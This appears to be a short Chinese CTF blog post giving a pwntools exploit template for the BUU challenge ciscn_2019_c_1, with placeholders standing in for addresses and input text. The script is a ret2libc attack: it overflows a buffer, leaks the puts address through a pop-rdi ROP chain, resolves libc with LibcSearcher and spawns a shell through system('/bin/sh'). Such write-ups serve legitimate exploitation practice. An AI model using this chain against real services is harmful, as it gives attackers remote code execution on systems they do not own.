+++
title = "wp and exp"
date = "2026-01-10"
type = "post"
categories = ['BUU']
tags = ['第一页', 'ciscn_2019_c_1']
draft = false
+++
```python
from pwn import *  
from LibcSearcher import *  
  
local_file  = '文件'  
local_libc  = 'libc表'  
remote_libc = 'libc表'  
select = 1  
if select == 0:  
    r = process(local_file)  
    libc = ELF(local_libc)  
else:  
    r = remote(地址)  
    libc = ELF(remote_libc)  
elf = ELF(local_file)  
context.log_level = 'debug'  
# ROPgadget --binary ciscn_2019_c_1 --only 'pop|ret'  
pop_rdi=地址  
ret=地址  
  
#判断一    r.sendlineafter('文本',b'选择')  
payload="溢出"+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.symbols['main'])  
r.sendlineafter('文本',payload)  
r.recvline()  
r.recvline()  
puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))#取低三位  
libc = LibcSearcher('puts', puts_addr)  
libc_base = puts_addr - libc.dump('puts')  
system_addr = libc_base + libc.dump('system')  
binsh_addr = libc_base + libc.dump('str_bin_sh')  
#重新进到main中再次过判断    r.sendlineafter('文本',b'选择')  
payload="溢出（这里如果输入判断用的strlen可以直接\0过掉）"+p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)  
r.sendlineafter('文本',payload)  
r.interactive()
```
